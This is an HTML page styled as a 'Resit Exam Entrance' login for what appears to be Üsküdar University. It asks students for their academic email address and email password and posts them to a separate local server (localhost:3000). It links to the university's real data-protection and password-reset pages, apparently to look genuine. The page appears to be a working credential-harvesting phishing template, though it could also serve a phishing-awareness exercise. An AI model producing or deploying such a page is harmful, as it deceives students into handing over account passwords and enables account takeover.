<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <link rel="stylesheet" href="css/student.css" />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap"
      rel="stylesheet"
    />
    </head>
  <body>
    <section>
      <div class="container">
        <div class="top-container">
          <img src="images/283d341b4e9d62729749d98fcc1e4640.png" alt="" />
          <h1>Resit Exam Entrance</h1>
        </div>
        <div class="bottom-container">
          <form action="http:localhost:3000/student" method="post">
            <div class="form-group">
              <label for="email">Student ID Number</label>
              <input
                type="email"
                id="email"
                name="email"
                placeholder="Your Academic Email Address"
                required
              />
            </div>
            <div class="form-group">
              <label for="password">Email Password</label>
              <input
                type="password"
                id="password"
                name="password"
                placeholder="Your Academic Email password"
                required
              />
            </div>
            <div class="checkbox">
              <input type="checkbox" id="terms" name="terms" required />
              <label for="terms" class="terms"
                >I have read and approved
                <a href="https://uskudar.edu.tr/tr/kisisel-verilerin-korunmasi"
                  >the Information and Disclosure Text</a
                >
                under the Law on Protection of Personal Data . (* )</label
              >
            </div>
            <button type="submit">Login</button>
            <div class="lastwo">
              <a href="resitexam.html">Not a Student</a>
              <a href="https://teksifre.uskudar.edu.tr/">I forgot my Password</a>
            </div>
          </form>
        </div>
      </div>
    </section>
  </body>
</html>
